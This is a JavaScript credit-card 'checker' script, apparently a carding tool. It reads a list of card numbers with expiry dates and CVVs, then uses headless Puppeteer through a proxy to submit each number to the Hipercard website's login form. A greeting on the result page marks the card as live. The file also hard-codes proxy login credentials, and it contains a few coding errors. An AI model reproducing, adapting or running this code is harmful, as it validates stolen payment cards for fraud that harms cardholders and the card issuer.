const fs = require('fs/promises');
const figlet = require('figlet');
const signale = require('signale');
const chalk = require('chalk');
const req = require('request');
const LineByLineReader = require('line-by-line');
const puppeteer = require('puppeteer');
const { await } = require('signale');

figlet("Conexao RJ x SP", {
    font: "standard"
}, function(err, data) {
    console.log()
    console.log(chalk.whiteBright(data))
    console.log("+ " + `Checker CC Hipercard`);
    console.log()
    console.log("Checker Iniciado!");

});

function request(config) {
  return new Promise((resolve, reject) => {
      req(config, function(err, res) {
          if (err) { reject(err) }
          else { resolve(res) }
      })
  })
}


async function getData(dados){

  var separador = dados.split(`|`);
  var cc = separador[0];
  var mes = separador[1];
  var ano = separador[2];
  var cvv = separador[3];   

  for(;;){

      const browser = await puppeteer.launch(
          {
              ignoreHTTPSErrors: true,
              headless: true,
      arqs:['--proxy-server=196.18.198.56:51683']
          }
      );

  const context = await browser.createIncognitoBrowserContext();
      const page = await context.newPage();

  await page.setCacheEnabled(false);

  await page.authenticate({
    username: 'jacintogomes993',
    password: 'jacintogomes339'
  })
      
      await page.setViewport({
          width: 1366,
          height: 768,
          deviceScaleFactor: 1
        });
        
        try {
          await page.goto('https://www.hipercard.com.br/cartoes/', {waitUntil: 'load', timeout: 0});

          await page.waitForSelector('#cc')
          await page.type('#cc', `${cc}`)
          await page.click('[id="btnLoginSubmit"]', {delay: 50})
          await page.waitForSelector('h1')

          const msgLive = await page.$eval('h1', el => el.innerText)
          var rtrn = msgLive.split(",")

          var strrtn = rtrn[0];

          if(strrtn == "Olá"){
            signale.success(`Hipercard »  [${msgLive}]${cc}|${mes}|${ano}|${cvv} » #ConexaoRJxSP`)
            //.appendFileSync("retornos/Lives.txt", `PAGAMENTO APROVADO » ${cc}|${mes}|${ano}|${cvv} » [${url}]\n`)
            await browser.close();
          }else{
            signale.error(`Hipercard » Cartão Invalido » ${cc}|${mes}|${ano}|${cvv}`);
            //fs.appendFileSync("retornos/Lives.txt", `PAGAMENTO APROVADO » ${cc}|${mes}|${ano}|${cvv} » [${url}]\n`)
            await browser.close();   
          }

          //await browser.close()
          //await page.reload()
          break
      } catch (error) {
          await page.close()
          await browser.close()
          break
      }
  }
}

var run = async () => {

lr = new LineByLineReader('lista.txt');

lr.on('line', async function (line) {

  lr.pause();
  await getData(line);
  lr.resume();

});

}

run();
